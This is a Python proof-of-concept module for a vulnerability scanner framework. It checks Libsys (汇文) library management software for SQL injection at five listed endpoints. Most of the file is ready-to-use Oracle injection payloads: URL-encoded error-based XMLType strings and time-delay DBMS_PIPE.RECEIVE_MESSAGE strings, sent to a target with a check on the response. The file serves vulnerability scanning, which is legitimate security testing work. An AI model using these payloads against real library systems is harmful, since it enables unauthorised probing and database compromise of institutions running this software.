# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'Libsys_0012' # 平台漏洞编号，留空
    name = '汇文软件 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        汇文（Libsys）软件由于参数过滤不严谨，导致多处存在SQL注入漏洞。
        /opac/cls_browsing_book.php
        /asord/asord_searchresult.php
        /opac/search_rss.php
        /opac/peri_nav_cls_peri.php
        /opac/sci_browsing_book.php
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '汇文图书管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5fe53a65-c501-427a-af09-44be5fd60232'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payloads = {
                '/opac/cls_browsing_book.php?cls=-1':'%27%29%20OR%207352%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%271%27%20LIKE%20%271',
                '/asord/asord_searchresult.php?q=88952634&type=02':'%27%29%20AND%201055%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27Ofjo%27%3D%27Ofjo',
                '/opac/search_rss.php?callno=I313.45&doctype=ALL&lang_code=ALL&match_flag=forward&displaypg=20&showmode=list&orderby=DESC&use_flag=3&sort=CATA_DATE&onlylendable=yes&location=-8641':'%20OR%202714%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29',
                '/opac/peri_nav_cls_peri.php?classid=%00':'%27%20AND%203321%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27fKMS%27%3D%27fKMS',
                '/opac/sci_browsing_book.php?cls=-6835':'%27%29%20OR%205155%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287352%3D7352%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27zcdX%27%20LIKE%20%27zcdX',
                }
            for payload in payloads:
                code, head, res, err, _ = hh.http(self.target + payload + payloads[payload])
                if code == 200 and 'qzkvq1qkjvq' in res:
                    #security_hole(self.target + payload + " :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                else:
                    getdata1 = '%25%27%20AND%207394%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2875%29%7C%7CCHR%28100%29%7C%7CCHR%2885%29%2C5%29%20AND%20%27%25%27%3D%27'
                    getdata2 = '%25%27%20AND%207394%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2884%29%7C%7CCHR%2875%29%7C%7CCHR%28100%29%7C%7CCHR%2885%29%2C0%29%20AND%20%27%25%27%3D%27'
                    t1 = time.time()
                    code, head, res, errcode, _ = hh.http(self.target + payload + getdata1)
                    t2 = time.time()
                    code, head, res, errcode, _ = hh.http(self.target + payload + getdata2)
                    t3 = time.time()
                    if code == 200 and (2*t2 - t1 - t3 > 3):
                        #security_hole(arg + payload + "   :sql Injection")
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))                        

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
